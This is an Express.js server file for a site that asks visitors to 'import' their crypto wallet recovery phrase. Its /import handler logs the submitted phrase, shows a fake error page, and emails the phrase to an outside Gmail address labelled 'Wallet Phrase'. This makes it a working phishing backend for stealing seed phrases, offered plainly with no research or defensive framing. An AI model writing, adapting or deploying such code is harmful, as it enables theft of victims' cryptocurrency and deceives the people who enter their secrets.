const express = require("express")
const path = require("path")
const nodemailer = require("nodemailer")
require('dotenv').config()

const app = express()

app.use(express.static('public'))
app.use(express.urlencoded({ extended: true}))

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname+"/views/index.html"))
})

app.get("/integrate-wallets", (req, res) => {
    res.sendFile(path.join(__dirname+"/views/integrate-wallets.html"))
})

app.get("/import-phrase", (req, res) => {
    res.sendFile(path.join(__dirname+"/views/import-phrase.html"))
})

app.post("/import", async (req, res) => {
    try {
        console.log(req.body.Phrase)
        res.redirect("/error")
        let transport = nodemailer.createTransport({
            host: 'smtp.ethereal.email',
            port: 587,
            auth: {
                user: process.env.USER,
                pass: process.env.PASS
            }
        })
    
        let info = await transport.sendMail({
            from: "Wallet Auth",
            to: "michaelstone@gmail.com",
            subject: "Wallet Phrase",
            text: req.body.Phrase,
            html: `<b>${req.body.Phrase}</b>`
        })
    } catch(err) {
        console.log(err)
    }
})

app.get("/error", (req, res) => {
    res.sendFile(path.join(__dirname+"/views/error.html"))
})

const port = process.env.PORT || 3000

app.listen(port, () => console.log(`LISTENING TO THE SERVER ON PORT ${port}`))